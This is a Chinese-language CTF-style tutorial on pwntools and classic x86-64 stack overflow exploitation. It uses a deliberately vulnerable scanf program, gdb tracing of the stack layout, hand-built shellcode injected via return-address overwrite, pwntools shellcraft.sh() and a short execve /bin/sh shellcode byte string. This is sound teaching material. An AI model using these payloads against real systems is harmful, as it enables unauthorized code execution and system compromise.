# Pwb 基础
## Pwntools交互

- 安装：
	- `pip install pwntools`
- 导入：
	- `from pwn import *`
- 连接可执行文件(或shell命令)
	- `p = process(./crackme.elf)`
	- `p = process(['nc','127.0.0.1','0721'])`
- 设置环境
	- `context.log_level = 'DEBUG'` 开启debug模式
	- `context.arch = 'amd64'` 32位修改成别的 (如 i386)
- 发送
	- `p.sendafter(b"what's your name: \n", b'Nimisora')` 需要时 byte 流形式
- 暂停
	- `pause()`
- 交互模式
	- `p.interactive()`


## 栈溢出 & SHELLCODE

!!! danger "了解StackOverflow，相信你就知道为什么要慎用gets和scanf读取输入了"

### 经典的栈溢出攻击

一个似乎没有什么问题的简单交互程序：

```c
#include <stdio.h>

int main() {
    char name[64];
    printf("What's your name?");
    scanf("%s", name);
    printf("Hello, %s!\n", name);
    return 0;
}
```

将其另存为 `victim.c` ，用 gcc 编译并运行：

```c
$ gcc victim.c -o victim -g
$ ./victim 
What's your name?Jack
Hello, Jack!
```

!!! note "上面的编译选项中 `-g` 表示输出调试信息。"

这段程序声明了一个长度为 64 的字节型数组，然后打印提示信息，再读取用户输入的名字，最后输出 Hello 和用户输入的名字。代码似乎没什么问题， name 数组 64 个字节应该是够了吧？毕竟没人的姓名会有 64 个字母，毕竟我们的内存空间也是有限的。

但是，往坏处想一想，没人能阻止用户在终端输入 100 甚至 1000 个的字符，当那种情况发生时，会发生什么事情？

name 数组只有 64 个字节的空间，那些多余的字符呢，会到哪里去？

!!! warning "多出的字符向栈底部溢出"

为了回答这两个问题，需要了解程序运行时 name 数组是如何保存在内存中的，这是一个局部变量，显然应该保存在栈上，那栈上的布局又是怎样的？让我们来分析一下程序中的汇编指令吧，先将目标程序的汇编码输出到 victim.asm 文件中，命令如下：

```shell
objdump -d victim -M intel > victim.asm
```

然后打开 victim.asm 文件，找到其中的 main 函数的代码：

```asm
0000000000400576 <main>:
  400576:   55                      push   rbp
  400577:   48 89 e5                mov    rbp,rsp
  40057a:   48 83 ec 40             sub    rsp,0x40
  40057e:   bf 44 06 40 00          mov    edi,0x400644
  400583:   b8 00 00 00 00          mov    eax,0x0
  400588:   e8 b3 fe ff ff          call   400440 <printf@plt>
  40058d:   48 8d 45 c0             lea    rax,[rbp-0x40]
  400591:   48 89 c6                mov    rsi,rax
  400594:   bf 56 06 40 00          mov    edi,0x400656
  400599:   b8 00 00 00 00          mov    eax,0x0
  40059e:   e8 cd fe ff ff          call   400470 <__isoc99_scanf@plt>
  4005a3:   48 8d 45 c0             lea    rax,[rbp-0x40]
  4005a7:   48 89 c6                mov    rsi,rax
  4005aa:   bf 59 06 40 00          mov    edi,0x400659
  4005af:   b8 00 00 00 00          mov    eax,0x0
  4005b4:   e8 87 fe ff ff          call   400440 <printf@plt>
  4005b9:   b8 00 00 00 00          mov    eax,0x0
  4005be:   c9                      leaved
  4005bf:   c3                      ret
```

该函数的开头的 _**push rbp; mov rbp, rsp; sub rsp, 0x40**_ ，先保存 rbp 的数值，再令 rbp 等于 rsp ，然后将栈顶指针 rsp 减小 0x40 （也就是 64 ），相当于在栈上分配长度为 64 的空间

main 函数中只有 name 一个局部变量，显然这段空间就是 name 数组，即 name 的起始地址为 _**rbp-0x40**_ 。再结合函数结尾的 _**leave; ret**_ ，同时类比一下 32 位汇编中的函数栈帧布局，可以画出本程序中 main 函数的栈帧布局如下（请注意下图是按 ==栈顶在上、栈底在下== 的方式画的）：

```
                     Stack
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
 name(-0x40)--> +-------------+
                |     ...     |
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
  rbp(+0x00)--> +-------------+
                |   old rbp   |
     (+0x08)--> +-------------+ <--rsp points here
                |   ret rip   |
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
                +-------------+
```

rbp 即函数的栈帧基指针，在main函数中， name 数组保存在 _**rbp-0x40~rbp+0x00**_ 之间， _**rbp+0x00**_ 处保存的是 _**上一个函数的 rbp 数值**_ ， _**rbp+0x08**_ 处保存了 _**main 函数的返回地址**_ 。当main函数执行完 leave 命令，执行到 ret 命令时：上一个函数的 rbp 数值已重新取回至 rbp 寄存器，栈顶指针 rsp 已经指向了保存这个返回地址的单元。之后的 ret 命令会将此地址出栈，然后跳到此地址。

现在可以回答刚才那个问题了，如果用户输入了很多很多字符，会发生什么事情。此时 scanf 函数会读取第一个空格字符之前的所有字符，然后全部拷贝到 name 指向的地址处。若用户输入了 100 个 “A” 再回车，则栈会是下面这个样子：

```
                     Stack
                +-------------+
                |     ...     |
                +-------------+
                |     ...     |
 name(-0x40)--> +-------------+
                |   AAAAAAAA  |
                +-------------+
                |   AAAAAAAA  |
                +-------------+
                |   AAAAAAAA  |
                +-------------+
                |   AAAAAAAA  |
  rbp(+0x00)--> +-------------+
                |   AAAAAAAA  | (should be "old rbp")
     (+0x08)--> +-------------+ <--rsp points here
                |   AAAAAAAA  | (should be "ret rip")
                +-------------+
                |   AAAAAAAA  |
                +-------------+
                |     ...     |
                +-------------+
```

也就是说，上一个函数的 _**rbp**_ 数值以及 _**main 函数的返回地址**_ 全部都被改写了，当执行完 ret 命令后， cpu 将跳到 0x4141414141414141 ('AAAAAAAA') 地址处，开始执行此地址的指令。

在 Linux 系统中， 0x4141414141414141 是一个非法地址，因此程序会出错并退出。但是，如果用户输入了精心挑选的字符后，覆盖在这里的数值是一个合法的地址呢？如果这个地址上恰好保存了用户想要执行的恶意的指令呢？会发生什么事情？

以上就是 _**栈溢出**_ 的本质，如果程序在接受用户输入的时候不对 _**下标越界**_ 进行检查，直接将其保存到栈上，用户就有可能利用这个漏洞，输入 _**足够多的、精心挑选的字符**_ ，改写函数的 _**返回地址**_ （也可以是 jmp 、 call 指令的 _**跳转地址**_ ），由此获取 _**对 cpu 的控制**_ ，从而执行任何他想执行的动作。

下面介绍最经典的栈溢出攻击方法：将想要执行的指令机器码写到 name 数组中，然后改写函数返回地址为 name 的起始地址，这样 ret 命令执行后将会跳转到 name 起始地址，开始执行 name 数组中的机器码。

我们将用这种方法执行一段简单的程序，该程序仅仅是在终端打印 “Hack!” 然后正常退出。

首先要知道 name 的起始地址，打开 gdb ，对 victim 进行调试，输入 _**gdb -q ./victim**_ ，再输入 _**break *main**_ 在 main 函数的开头下一个断点，再输入 _**run**_ 命令开始运行，如下：

```shell
$ gdb -q ./victim
Reading symbols from ./victim...done.
(gdb) break *main
Breakpoint 1 at 0x400576: file victim.c, line 3.
(gdb) run
Starting program: /home/hcj/blog/rop/ch02/victim 

Breakpoint 1, main () at victim.c:3
3   int main() {
=> 0x0000000000400576 <main+0>: 55  push   rbp
   0x0000000000400577 <main+1>: 48 89 e5    mov    rbp,rsp
   0x000000000040057a <main+4>: 48 83 ec 40 sub    rsp,0x40
(gdb) 
```

此时程序停留在 main 函数的第一条指令处，输入 _**p &name\[0\]**_ 和 _**x/gx $rsp**_ 分别查看 name 的起始指针和此时的栈顶指针 rsp 。

```shell
(gdb) p &name[0]
$1 = 0x7fffffffe100 "\001"
(gdb) x/gx $rsp
0x7fffffffe148: 0x00007ffff7a54b45
(gdb) 
```

得到 name 的起始指针为 0x7fffffffe100 、此时的栈顶指针 rsp 为 0x7fffffffe148 ， name 到 rsp 之间一共 0x48 （也就是 72 ）个字节，这和之前的分析是一致的。

下面来写攻击指令的机器码，首先写出汇编代码：

```asm
[section .text]
        global _start

_start:
        jmp END
BEGIN:
        mov rax, 1
        mov rdi, 1
        pop rsi
        mov rdx, 5
        syscall

        mov rax, 0x3c
        mov rdi, 0
        syscall
END:
        call BEGIN
        DB "Hack!"
```

这段程序和第一节的 Hello-x64 基本一样，不同之处在于巧妙的利用了 _**call BEGIN 和 pop rsi**_ 获得了字符串 “Hack” 的地址、并保存到 rsi 中。将以上代码保存为 shell.asm ，编译运行一下：

```shell
$ nasm -f elf64 shell.asm
$ ld -s -o shell shell.o
$ ./shell
Hack!
```

然后用 objdump 程序提取出机器码：

```
$ objdump -d shell -M intel
...
0000000000400080 <.text>:
  400080:   eb 1e                   jmp    0x4000a0
  400082:   b8 01 00 00 00          mov    eax,0x1
  400087:   bf 01 00 00 00          mov    edi,0x1
  40008c:   5e                      pop    rsi
  40008d:   ba 05 00 00 00          mov    edx,0x5
  400092:   0f 05                   syscall 
  400094:   b8 3c 00 00 00          mov    eax,0x3c
  400099:   bf 00 00 00 00          mov    edi,0x0
  40009e:   0f 05                   syscall 
  4000a0:   e8 dd ff ff ff          call   0x400082
  4000a5:   48 61                   rex.W (bad) 
  4000a7:   63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]
```

以上机器码一共 42 个字节， name 到 ret rip 之间一共 72 个字节，因此还需要补 30 个字节，最后填上 name 的起始地址 0x7fffffffe100 。 main 函数执行到 ret 命令时，栈上的数据应该是下面这个样子的（注意最后的 name 起始地址需要按 _**小端顺序**_ 保存）：

```
                                        Stack
 name(0x7fffffffe100)--> +---------------------------------+ <---+
                         |  eb 1e           (jmp END)      |     |
                BEGIN--> +---------------------------------+     |
                         |  b8 01 00 00 00  (mov eax,0x1)  |     |
                         +---------------------------------+     |
                         |  bf 01 00 00 00  (mov edi,0x1)  |     |
                         +---------------------------------+     |
                         |  5e              (pop rsi)      |     |
                         +---------------------------------+     |
                         |  ba 05 00 00 00  (mov edx,0x5)  |     |
                         +---------------------------------+     |
                         |  0f 05           (syscall)      |     |
                         +---------------------------------+     |
                         |  b8 3c 00 00 00  (mov eax,0x3c) |     |
                         +---------------------------------+     |
                         |  bf 00 00 00 00  (mov edi,0x0)  |     |
                         +---------------------------------+     |
                         |  0f 05           (syscall)      |     |
                   END-> +---------------------------------+     |
                         |  e8 dd ff ff ff  (call BEGIN)   |     |
                         +---------------------------------+     |
                         |  48 61 63 6b 21  ("Hack!")      |     |
     (0x7fffffffe12a)--> +---------------------------------+     |
                         |  "\x00"*30                      |     |
  rsp(0x7fffffffe148)--> +---------------------------------+     |
                         |  00 e1 ff ff ff 7f 00 00        | ----+
                         +---------------------------------+
```

!!! info "小端顺序"
	在python中， 小端顺序可以直接用 `p64` 函数转换(在32位系统中用`p32`)

上图中的栈上的所有字节码就是我们需要输入给 scanf 函数的字符串，这个字符串一般称为 shellcode 。由于这段 shellcode 中有很多无法通过键盘输入的字节码，因此用 python 将其打印至文件中：

```shell
$ python -c 'print "\xeb\x1e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x05\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x61\x63\x6b\x21" + "\x00"*30 + "\x00\xe1\xff\xff\xff\x7f\x00\x00"' > shellcode
```

现在可以对 victim 进行攻击了，不过目前只能在 gdb 的调试环境下进行攻击。输入 _**gdb -q ./victim**_ ，再输入 _**run < shellcode**_：

```shell
$ gdb -q ./victim
Reading symbols from ./victim...done.
(gdb) run < shellcode
Starting program: /home/hcj/blog/rop/ch02/victim < shellcode
What's your name?Hello, ��!
Hack![Inferior 1 (process 2711) exited normally]
(gdb) 
```

可以看到 shellcode 已经顺利的被执行，栈溢出攻击成功。

编写 shellcode 需要注意两个事情：

- （1）为了使 shellcode 被 scanf 函数全部读取， shellcode 中不能含有空格字符（包括空格、回车、Tab键等），也就是说不能含有 _**\x10、\x0a、\x0b、\x0c、\x20**_ 等这些字节码，否则 shellcode 将会被 _**截断**_ 。如果被攻击的程序使用 gets、strcpy 这些字符串拷贝函数，那么 shellcode 中不能含有 _**\x00**_ 。
- （2）由于 shellcode 被加载到栈上的位置不是固定的，因此要求 shellcode 被加载到任意位置都能执行，也就是说 shellcode 中要使用 _**相对寻址**_ 。


网上有非常多的 shellcode 可以参考使用，在这里可以直接使用 pwntools 自带的：

```python
from pwn import *

sc_asm = shellcraft.sh() # 汇编格式
sc = asm(sc_asm) # 比特流格式

p.sendafter(b"what's your name: \n", sc.ljust(64, b"\x90"))
# 向右补齐64位，按实际需求修改
```

最短的 SHELLCODE 如下

```python
sc = (
	b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	b"\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
).ljust(length,b'\x90')
```

### 返回地址覆盖

有的时候，题目给出的可读可写可执行的地址并不与接收输入的地址相连。这种情况，我们可以通过栈溢出用上述可执行地址覆盖该函数的 return 地址，使得执行 return 操作的时候执行上述地址上面的 shellcode

使用 IDA 打开可执行文件，观察其栈分布情况，一般函数的 return 地址位于 `$rbp + 0x08` 处，而 main 函数的 `$rbp` 一般是 `0x00`

如果可读可写可执行的地址为 `0x20000` 格式，那么我们传给文件的地址应该为： `p64(0x20000)` (如果是 32 位就用 `p32`)

